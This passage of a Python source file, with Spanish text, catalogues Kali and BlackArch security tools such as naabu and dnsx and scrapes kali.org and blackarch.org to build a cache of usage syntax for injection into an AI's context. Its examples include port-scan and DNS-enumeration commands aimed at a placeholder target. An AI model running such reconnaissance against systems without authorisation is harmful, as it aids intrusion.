        "summary": "Port scanner moderno y veloz de ProjectDiscovery con integración Nmap.",
        "description": "Naabu es un escáner de puertos rápido escrito en Go por ProjectDiscovery, diseñado para integrarse con nuclei y otras herramientas del ecosistema.",
        "binaries": ["naabu"],
        "usage_examples": [
            "naabu -host target.com -top-ports 1000 -silent",
            "naabu -host target.com -p - -silent | httpx -silent",
        ],
        "flags": {
            "-host <target>": "Host o dominio objetivo",
            "-p <ports>": "Puertos a escanear (- para todos)",
            "-top-ports <n>": "Escanear los N puertos más comunes",
            "-silent": "Mostrar solo los puertos abiertos",
            "-nmap-cli <args>": "Ejecutar Nmap sobre los puertos encontrados",
        },
    },
    "dnsx": {
        "name": "dnsx",
        "category": "Information Gathering",
        "url": "https://github.com/projectdiscovery/dnsx",
        "summary": "Toolkit DNS ultra rápido de ProjectDiscovery para resolución y enumeración masiva.",
        "description": "dnsx es una herramienta de resolución DNS multipropósito, rápida y confiable para resolver registros masivos A, AAAA, CNAME, MX, NS, TXT, SOA, PTR.",
        "binaries": ["dnsx"],
        "usage_examples": [
            "echo 'target.com' | dnsx -a -aaaa -mx -ns -txt -resp",
            "subfinder -d target.com -silent | dnsx -silent -a -resp",
        ],
        "flags": {
            "-a": "Resolver registros A (IPv4)",
            "-aaaa": "Resolver registros AAAA (IPv6)",
            "-mx": "Resolver registros MX (servidores de correo)",
            "-ns": "Resolver registros NS (nameservers)",
            "-txt": "Resolver registros TXT (SPF, DKIM, DMARC)",
            "-resp": "Mostrar las respuestas DNS junto con el dominio",
            "-silent": "Modo silencioso, solo output relevante",
        },
    },
}



@dataclass
class KaliTool:
    name: str
    category: str
    url: str
    summary: str
    description: str
    binaries: List[str] = field(default_factory=list)
    usage_examples: List[str] = field(default_factory=list)
    flags: Dict[str, str] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> "KaliTool":
        return cls(
            name=data.get("name", ""),
            category=data.get("category", "General"),
            url=data.get("url", ""),
            summary=data.get("summary", ""),
            description=data.get("description", ""),
            binaries=data.get("binaries", []),
            usage_examples=data.get("usage_examples", []),
            flags=data.get("flags", {}),
        )


class KaliToolsDatabase:
    """Base de datos y scraper para las herramientas oficiales de Kali Linux."""

    def __init__(self):
        self.tools: Dict[str, KaliTool] = {}
        self._load()

    def _ensure_cache_dir(self):
        CONFIG_DIR.mkdir(parents=True, exist_ok=True)

    def _load(self):
        """Carga las herramientas desde el archivo local o inicializa con la base pre-cargada."""
        # 1. Cargar base de datos predefinida
        for name, data in CURATED_DEFAULT_TOOLS.items():
            self.tools[name.lower()] = KaliTool.from_dict(data)

        # 2. Sobrescribir/extender con la base de datos descargada localmente si existe
        if TOOLS_CACHE_FILE.exists():
            try:
                with open(TOOLS_CACHE_FILE, "r", encoding="utf-8") as f:
                    cached_data = json.load(f)
                    for name, data in cached_data.items():
                        self.tools[name.lower()] = KaliTool.from_dict(data)
            except Exception as e:
                console.print(f"[dim yellow][!] Error al leer cache de herramientas: {e}[/dim yellow]")

    def save(self):
        """Persiste la base de datos actual en el archivo de caché JSON."""
        self._ensure_cache_dir()
        try:
            data = {name: tool.to_dict() for name, tool in self.tools.items()}
            with open(TOOLS_CACHE_FILE, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            console.print(f"[bold red][!] Error al guardar cache de herramientas: {e}[/bold red]")

    def get_tool(self, name: str) -> Optional[KaliTool]:
        """Obtiene la información detallada de una herramienta por su nombre."""
        return self.tools.get(name.lower().strip())

    def search_tools(self, query: str) -> List[KaliTool]:
        """Busca herramientas por nombre, categoría, comando o palabras clave."""
        q = query.lower().strip()
        results: List[KaliTool] = []
        for tool in self.tools.values():
            if (
                q in tool.name.lower()
                or q in tool.category.lower()
                or q in tool.summary.lower()
                or q in tool.description.lower()
                or any(q in b.lower() for b in tool.binaries)
            ):
                results.append(tool)
        return results

    def get_all_tools(self) -> List[KaliTool]:
        return list(self.tools.values())

    def get_categories(self) -> Dict[str, List[str]]:
        cats: Dict[str, List[str]] = {}
        for tool in self.tools.values():
            cat = tool.category or "General"
            if cat not in cats:
                cats[cat] = []
            cats[cat].append(tool.name)
        return cats

    def detect_relevant_context(self, text: str) -> str:
        """
        Analiza el texto de una petición del usuario o tarea y devuelve un resumen
        concreto de sintaxis y flags de las herramientas de Kali pertinentes para inyectar a la IA.
        """
        text_lower = text.lower()
        matched_tools = []
        stop_words = {"ip", "as", "in", "to", "at", "is", "or", "and", "de", "la", "el", "un", "en", "que", "si", "no", "por"}

        for name, tool in self.tools.items():
            if len(name) < 3 or name in stop_words:
                continue
            # Coincidencia por nombre exacto de herramienta
            if re.search(r"\b" + re.escape(name) + r"\b", text_lower):
                matched_tools.append(tool)

        if not matched_tools:
            return ""

        context_blocks = ["[REFERENCIA DE SINTAXIS KALI/ARCH]"]
        for tool in matched_tools[:2]:  # Limitar a máximo 2 herramientas para ahorrar tokens
            lines = [f"• {tool.name.upper()}: {tool.summary}"]
            if tool.usage_examples:
                lines.append(f"  Ejemplo: {tool.usage_examples[0]}")
            if tool.flags:
                first_flags = [f"{k}: {v}" for k, v in list(tool.flags.items())[:3]]
                lines.append(f"  Flags: {'; '.join(first_flags)}")
            context_blocks.append("\n".join(lines))

        return "\n".join(context_blocks) + "\n"

    def scrape_from_kali_org(self, limit: Optional[int] = None, verbose: bool = True) -> int:
        """
        Realiza web scraping en vivo de https://www.kali.org/tools/
        Extrayendo el índice de herramientas y sus páginas de documentación detallada.
        """
        try:
            from bs4 import BeautifulSoup
            import requests
        except ImportError:
            console.print("[bold red][!] Se requieren 'beautifulsoup4' y 'requests' para ejecutar el scraper.[/bold red]")
            console.print("[yellow][i] Instálalos con: pip install beautifulsoup4 requests[/yellow]")
            return 0

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 (CoderKali/1.0)"
        }

        if verbose:
            console.print(f"[bold cyan][*] Conectando a {BASE_KALI_TOOLS_URL}...[/bold cyan]")

        try:
            resp = requests.get(BASE_KALI_TOOLS_URL, headers=headers, timeout=20)
            resp.raise_for_status()
        except Exception as e:
            console.print(f"[bold red][!] Error al conectar con kali.org: {e}[/bold red]")
            return 0

        soup = BeautifulSoup(resp.text, "html.parser")

        # Encontrar todos los enlaces a herramientas
        tool_links = []
        for a_tag in soup.find_all("a", href=True):
            href = a_tag["href"]
            if href.startswith("/tools/") and href != "/tools/":
                full_url = f"https://www.kali.org{href}" if href.startswith("/") else href
                tool_slug = href.strip("/").split("/")[-1]
                if tool_slug and tool_slug not in [t[0] for t in tool_links]:
                    tool_links.append((tool_slug, full_url, a_tag.get_text(strip=True)))

        total_found = len(tool_links)
        if verbose:
            console.print(f"[bold green][✓] Se encontraron {total_found} herramientas en el catálogo de Kali Linux.[/bold green]")

        if limit and limit > 0:
            tool_links = tool_links[:limit]
            if verbose:
                console.print(f"[dim cyan][*] Limitando scraping a las primeras {limit} herramientas...[/dim cyan]")

        scraped_count = 0

        for tool_slug, url, anchor_text in tool_links:
            try:
                if verbose:
                    console.print(f"[dim]  Descargando documentación: {tool_slug}...[/dim]")

                tool_resp = requests.get(url, headers=headers, timeout=15)
                if tool_resp.status_code != 200:
                    continue

                tool_soup = BeautifulSoup(tool_resp.text, "html.parser")

                # Extraer título y descripción
                name = tool_slug
                h1 = tool_soup.find("h1")
                if h1:
                    name = h1.get_text(strip=True).lower()

                # Extraer resumen / descripción de los párrafos principales
                paragraphs = [p.get_text(strip=True) for p in tool_soup.find_all("p") if len(p.get_text(strip=True)) > 20]
                summary = paragraphs[0] if paragraphs else f"Herramienta oficial de Kali Linux: {name}"
                description = " ".join(paragraphs[:3]) if paragraphs else summary

                # Extraer categoría si existe en breadcrumbs o metadata
                category = "General"
                meta_cat = tool_soup.find("span", class_="category") or tool_soup.find("div", class_="card-header")
                if meta_cat:
                    category = meta_cat.get_text(strip=True)

                # Extraer bloques de código / sintaxis de comandos
                code_blocks = [code.get_text() for code in tool_soup.find_all(["pre", "code"]) if len(code.get_text()) > 5]
                usage_examples = []
                flags = {}

                for block in code_blocks:
                    for line in block.splitlines():
                        clean_line = line.strip()
                        if clean_line.startswith(name) or clean_line.startswith(f"sudo {name}"):
                            if clean_line not in usage_examples and len(usage_examples) < 6:
                                usage_examples.append(clean_line)
                        # Detección de flags (-h, --help, -p, etc.)
                        flag_match = re.match(r"^\s*(-[a-zA-Z0-9]|--[a-zA-Z0-9\-_]+)(?:\s+([^\s,]+))?\s{2,}(.+)$", clean_line)
                        if flag_match:
                            f_flag = flag_match.group(1)
                            f_desc = flag_match.group(3).strip()
                            if f_flag not in flags and len(flags) < 15:
                                flags[f_flag] = f_desc

                # Si no encontramos ejemplos en código, creamos sintaxis básica
                if not usage_examples:
                    usage_examples = [f"{name} --help", f"man {name}"]

                # Crear o actualizar en memoria
                self.tools[name] = KaliTool(
                    name=name,
                    category=category,
                    url=url,
                    summary=summary,
                    description=description,
                    binaries=[name],
                    usage_examples=usage_examples,
                    flags=flags,
                )
                scraped_count += 1

            except Exception as ex:
                if verbose:
                    console.print(f"[dim red]    Error al procesar {tool_slug}: {ex}[/dim red]")
                continue

        # Guardar en JSON
        self.save()
        if verbose:
            console.print(f"[bold green][✓] ¡Scraping finalizado! {scraped_count} herramientas indexadas y guardadas en cache local.[/bold green]")

        return scraped_count

    def scrape_blackarch_org(self, limit: Optional[int] = None, verbose: bool = True) -> int:
        """
        Realiza scraping en vivo de https://blackarch.org/tools.html
        Extrayendo el catálogo masivo de herramientas de seguridad de BlackArch Linux.
        """
        try:
            from bs4 import BeautifulSoup
            import requests
        except ImportError:
            console.print("[bold red][!] Se requieren 'beautifulsoup4' y 'requests'.[/bold red]")
            return 0

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }

        if verbose:
            console.print(f"[bold cyan][*] Conectando a {BASE_BLACKARCH_TOOLS_URL}...[/bold cyan]")

        try:
            resp = requests.get(BASE_BLACKARCH_TOOLS_URL, headers=headers, timeout=25)
            resp.raise_for_status()
        except Exception as e:
            console.print(f"[bold red][!] Error al conectar con blackarch.org: {e}[/bold red]")
            return 0

        soup = BeautifulSoup(resp.text, "html.parser")
        table = soup.find("table")
        if not table:
            # Buscar filas de herramientas
            rows = soup.find_all("tr")
        else:
            rows = table.find_all("tr")

        scraped_count = 0
        distro_info = detect_linux_distro()

        for tr in rows[1:]:  # Saltar header
            tds = tr.find_all("td")
            if len(tds) < 4:
                continue

            name = tds[0].get_text(strip=True).lower()
            version = tds[1].get_text(strip=True) if len(tds) > 1 else ""
            description = tds[2].get_text(strip=True) if len(tds) > 2 else ""
            category = tds[3].get_text(strip=True) if len(tds) > 3 else "BlackArch Security"
            
            link = tds[0].find("a")
            homepage = link["href"] if link and link.has_attr("href") else f"https://blackarch.org/tools.html#{name}"

            if not name or len(name) < 2:
                continue

            # Sintaxis y comandos en Arch Linux
            install_cmd = f"sudo pacman -S {name}" if distro_info["pkg_manager"] == "pacman" else f"sudo apt install {name}"
            usage_examples = [
                f"{name} --help",
                f"# Para instalar en Arch Linux: {install_cmd}",
            ]

            tool_obj = KaliTool(
                name=name,
                category=f"BlackArch: {category}",
                url=homepage,
                summary=description[:150],
                description=description,
                binaries=[name],
                usage_examples=usage_examples,
                flags={"--help": "Muestra las opciones de ayuda del comando", "pacman": f"Paquete disponible en BlackArch repo: {name}"},
            )

            self.tools[name] = tool_obj
            scraped_count += 1

            if limit and scraped_count >= limit:
                break

        self.save()
        if verbose:
            console.print(f"[bold green][✓] ¡Scraping de BlackArch completado! {scraped_count} herramientas de Arch agregadas al catálogo.[/bold green]")

        return scraped_count
